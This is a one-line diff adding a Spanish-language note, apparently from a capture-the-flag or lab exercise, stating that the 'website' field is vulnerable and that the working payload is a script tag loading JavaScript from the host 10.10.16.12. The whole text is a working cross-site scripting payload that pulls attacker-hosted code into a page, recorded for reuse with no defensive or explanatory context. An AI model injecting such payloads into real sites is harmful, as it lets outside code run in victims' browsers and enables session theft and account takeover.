@@ -1,0 +1,1 @@
+El campo vulnerable es website el payload que funciona es <script src="http://10.10.16.12/script.js"></script>
